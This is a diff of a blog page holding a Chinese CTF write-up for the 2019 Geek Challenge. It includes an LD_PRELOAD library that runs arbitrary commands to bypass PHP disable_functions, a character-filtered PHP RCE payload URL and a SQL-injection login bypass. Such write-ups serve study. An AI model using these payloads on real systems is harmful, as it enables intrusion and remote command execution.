@@ -65,7 +65,7 @@
 <h4 id="劫持系统函数绕过disable-functions"><a href="#劫持系统函数绕过disable-functions" class="headerlink" title="劫持系统函数绕过disable_functions"></a>劫持系统函数绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
 <p> <img src="https://asscreed.github.io/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/1571502795907.png" alt="1571502795907"></p>
 <p>bypass.c文件：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>
 
@@ -90,7 +90,7 @@
   <entry>
     <title>第十届极客大挑战Write-up</title>
     <url>/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/</url>
-    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#1-打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="1.打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>1.打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="2-你看见过我的菜刀么"><a href="#2-你看见过我的菜刀么" class="headerlink" title="2.你看见过我的菜刀么"></a>2.你看见过我的菜刀么</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>
+    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>
 
 
 
@@ -102,12 +102,12 @@
 
 
 
-<h2 id="3-BurpSuiiiiiit-拿起你的burp，开始战斗吧"><a href="#3-BurpSuiiiiiit-拿起你的burp，开始战斗吧" class="headerlink" title="3.BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧"></a>3.BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧</h2><p>附件下载下来，解压得到Extender.jar文件</p>
+<h2 id="BurpSuiiiiiit-拿起你的burp，开始战斗吧"><a href="#BurpSuiiiiiit-拿起你的burp，开始战斗吧" class="headerlink" title="BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧"></a>BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧</h2><p>附件下载下来，解压得到Extender.jar文件</p>
 <p>从名字和格式看应该BurpSuit的扩展包，用BP导入</p>
 <p>​      <img src="/2019/10/18/第十届极客大挑战Write-up/1571495641219.png" alt="1571495641219"></p>
 <p>​      <img src="/2019/10/18/第十届极客大挑战Write-up/1571374457080.png" alt="1571374457080"><br>​<br>​              导入失败，并提示我们查看errors页面<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374537984.png" alt="1571374537984"></p>
 <p>​        flag直接就出来了</p>
-<h2 id="4-性感潇文清，在线算卦：动作快点才能算到好卦。"><a href="#4-性感潇文清，在线算卦：动作快点才能算到好卦。" class="headerlink" title="4.性感潇文清，在线算卦：动作快点才能算到好卦。"></a>4.性感潇文清，在线算卦：动作快点才能算到好卦。</h2><p>输入姓名和生日后，返回了一个路径</p>
+<h2 id="性感潇文清，在线算卦：动作快点才能算到好卦。"><a href="#性感潇文清，在线算卦：动作快点才能算到好卦。" class="headerlink" title="性感潇文清，在线算卦：动作快点才能算到好卦。"></a>性感潇文清，在线算卦：动作快点才能算到好卦。</h2><p>输入姓名和生日后，返回了一个路径</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571374815419.png" alt="1571374815419"></p>
 <p>直接访问试下</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571374878503.png" alt="1571374878503"></p>
@@ -128,14 +128,14 @@
 <p>​    2攻击后，3立马攻击</p>
 <p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375974330.png" alt="1571375974330"></p>
 <p>​    得到flag</p>
-<h2 id="5-Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"><a href="#5-Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！" class="headerlink" title="5.Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"></a>5.Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571386357741.png" alt="1571386357741"></p>
+<h2 id="Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"><a href="#Easysql-最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！" class="headerlink" title="Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！"></a>Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/1571386357741.png" alt="1571386357741"></p>
 <p>什么防护都没有 </p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571387426532.png" alt="1571387426532">    </p>
 <p>直接进后台</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571387449879.png" alt="1571387449879"></p>
-<h2 id="6-RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me"><a href="#6-RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="6.RCE me: I don’t think U can system RCE, prove to me"></a>6.RCE me: I don’t think U can system RCE, prove to me</h2><p>这道题学到了很多！</p>
+<h2 id="RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me"><a href="#RCE-me-I-don’t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="RCE me: I don’t think U can system RCE, prove to me"></a>RCE me: I don’t think U can system RCE, prove to me</h2><p>这道题学到了很多！</p>
 <p>打开网页看看</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571495997995.png" alt="1571495997995"></p>
 <p>GET传参code，code中不能有A-Z，a-z，0-9，这些字符，而且字符限制在40个字符</p>
@@ -199,7 +199,7 @@
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571503618681.png" alt="1571503618681"></p>
-<h2 id="13-神秘的三叶草"><a href="#13-神秘的三叶草" class="headerlink" title="13.神秘的三叶草"></a>13.神秘的三叶草</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
+<h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
 <p>查看源码，发现Secret.php</p>
 <p>打开Secret.php</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215545399.png" alt="image-20191029215545399"></p>
@@ -212,7 +212,7 @@
 <p>修改XFF头</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029220337766.png" alt="image-20191029220337766"></p>
 <p>得到flag</p>
-<h2 id="15-Jiang‘s-Secret-我在那放了一个秘密！"><a href="#15-Jiang‘s-Secret-我在那放了一个秘密！" class="headerlink" title="15. Jiang‘s Secret:我在那放了一个秘密！"></a>15. Jiang‘s Secret:我在那放了一个秘密！</h2><p>打开主页</p>
+<h2 id="Jiang‘s-Secret-我在那放了一个秘密！"><a href="#Jiang‘s-Secret-我在那放了一个秘密！" class="headerlink" title="Jiang‘s Secret:我在那放了一个秘密！"></a>Jiang‘s Secret:我在那放了一个秘密！</h2><p>打开主页</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231444787.png" alt="image-20191029231444787"></p>
 <p>查看源码</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231426639.png" alt="image-20191029231426639"></p>
